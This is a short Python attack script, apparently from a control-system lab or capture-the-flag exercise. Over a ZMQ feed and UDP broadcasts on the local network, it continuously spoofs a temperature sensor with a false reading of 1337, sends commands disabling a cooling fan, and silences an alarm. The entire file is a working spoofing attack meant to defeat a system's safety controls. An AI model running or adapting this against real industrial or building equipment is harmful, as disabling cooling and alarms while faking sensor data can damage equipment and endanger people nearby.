################################################################################
# IMPORTS
################################################################################
import time
import zmq
import socket
import struct
import threading
import json
import os

################################################################################
# MAIN
################################################################################
def main():

    #Use ZMQ for local messages spoofing alarm
    context = zmq.Context()
    spoof_alarm_socket = context.socket(zmq.PUB)
    spoof_alarm_socket.connect("ipc:///tmp/feeds/2")

    #Use UDP socket to spoof fan
    spoof_fan_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    spoof_fan_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    #Use UDP socket to spoof TC by pretending to be sensor
    spoof_tc_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    spoof_tc_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    temp = 1337
    sensor_data = {
            'currentTemp': temp
    }

    while True:
        spoof_tc_socket.sendto(json.dumps(sensor_data), ("192.168.0.255", 4444))
        spoof_fan_socket.sendto(json.dumps({"enable": 0}), ("192.168.0.255", 4445))
        spoof_alarm_socket.send(json.dumps({"enable": 0}))

if __name__ == "__main__":
    main()